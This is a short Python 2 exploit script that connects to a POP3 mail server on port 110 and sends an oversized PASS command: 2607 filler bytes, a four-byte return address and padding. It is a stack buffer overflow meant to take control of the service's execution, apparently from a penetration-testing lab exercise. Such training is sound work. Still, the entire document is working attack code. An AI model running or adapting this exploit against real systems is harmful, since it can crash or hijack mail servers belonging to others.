#! /usr/bin/python
import socket
buffer="A"*2607+"\xe3\x41\x4b\x5f"+"C"*200
try:	
	print "send ..." 
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("10.1.1.24",110))
	s.recv(1024)
	s.send("USER text\r\n")
	s.recv(1024)
	s.send("PASS"+buffer+"\r\n")
	s.send("QUIT\r\n")
	s.close()
	print "Done"
except:
	print "unknow wrong"
